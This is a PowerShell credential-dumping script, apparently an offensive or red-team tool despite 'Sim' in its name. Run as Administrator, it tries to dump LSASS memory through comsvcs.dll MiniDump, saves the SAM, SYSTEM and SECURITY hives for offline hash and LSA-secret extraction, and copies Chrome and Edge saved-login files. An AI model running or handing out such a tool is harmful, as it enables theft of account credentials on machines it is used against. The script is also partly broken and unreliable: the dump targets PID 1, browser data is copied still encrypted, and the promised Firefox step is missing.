# (.\PASSdumpSim.ps1 -LSASS -NTLM -LSA -Browsers -OutputDir "C:\YourDesiredPath")

param (
    [switch]$LSASS,    # Dump credentials from LSASS memory
    [switch]$NTLM,     # Extract NTLM hashes from SAM
    [switch]$LSA,      # Dump LSA secrets
    [switch]$Browsers,  # Extract saved passwords from browsers
    [string]$OutputDir = "C:\Users\"  # Desired output location
)

# Check if running as Administrator
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
if (-Not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] ERROR: Please run this script as Administrator." -ForegroundColor Red
    exit
}

# Create the output directory if it doesn't exist
if (-Not (Test-Path $OutputDir)) {
    New-Item -Path $OutputDir -ItemType Directory
}

# Function: Dump LSASS Memory
function Dump-LSASS {
    $DumpFilePath = "$OutputDir\lsass.dmp"
    
    Write-Host "[*] Attempting to dump LSASS Memory..." -ForegroundColor Cyan
    try {
        rundll32.exe comsvcs.dll, MiniDump 1 $DumpFilePath full
        Write-Host "[+] LSASS dump saved as $DumpFilePath. Use tools like 'strings' to analyze." -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Error dumping LSASS memory. You may need higher privileges or external tools." -ForegroundColor Red
    }
}

# Function: Extract NTLM Hashes from SAM Database
function Dump-NTLM {
    Write-Host "[*] Extracting NTLM Hashes from SAM..." -ForegroundColor Cyan
    reg save HKLM\SAM "$OutputDir\sam.hiv" /y
    reg save HKLM\SYSTEM "$OutputDir\system.hiv" /y
    Write-Host "[+] SAM and SYSTEM hives saved to $OutputDir. Use offline tools to extract hashes." -ForegroundColor Green
}

# Function: Extract LSA Secrets
function Dump-LSA {
    Write-Host "[*] Dumping LSA Secrets..." -ForegroundColor Cyan
    reg save HKLM\SECURITY "$OutputDir\security.hiv" /y
    Write-Host "[+] LSA secrets saved to $OutputDir. Analyze offline with Regedit." -ForegroundColor Green
}

# Function: Extract Browser Passwords
function Dump-Browsers {
    Write-Host "[*] Extracting Browser Passwords..." -ForegroundColor Cyan
    
    $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $LoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

    if (Test-Path $LoginDataPath) {
        Write-Host "[+] Chrome Login Data found. Extracting passwords..." -ForegroundColor Green
        $Passwords = Get-Content $LoginDataPath -Raw
        $Passwords | Out-File -FilePath "$OutputDir\chrome_passwords.txt"
        Write-Host "[+] Chrome passwords saved to $OutputDir\chrome_passwords.txt" -ForegroundColor Green
    } else {
        Write-Host "[!] Chrome passwords not found." -ForegroundColor Red
    }

    # Repeat for Edge and Firefox
    $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $EdgePath) {
        Write-Host "[+] Edge Login Data found. Extracting passwords..." -ForegroundColor Green
        $Passwords = Get-Content $EdgePath -Raw
        $Passwords | Out-File -FilePath "$OutputDir\edge_passwords.txt"
        Write-Host "[+] Edge passwords saved to $OutputDir\edge_passwords.txt" -ForegroundColor Green
    } else {
        Write-Host "[!] Edge passwords not found." -ForegroundColor Red
    }
}

# Execute functions based on user input
if ($LSASS) { Dump-LSASS }
if ($NTLM) { Dump-NTLM }
if ($LSA) { Dump-LSA }
if ($Browsers) { Dump-Browsers }

# Show usage if no parameters are given
if (!$LSASS -and !$NTLM -and !$LSA -and !$Browsers) {
    Write-Host "Usage: .\PASSdumpSim.ps1 -LSASS -NTLM -LSA -Browsers" -ForegroundColor Cyan
}

# Optionally, running all actions together in one command:
if ($LSASS -and $NTLM -and $LSA -and $Browsers) {
    Write-Host "[*] Executing all credential dump actions together..."
    Dump-LSASS
    Dump-NTLM
    Dump-LSA
    Dump-Browsers
}
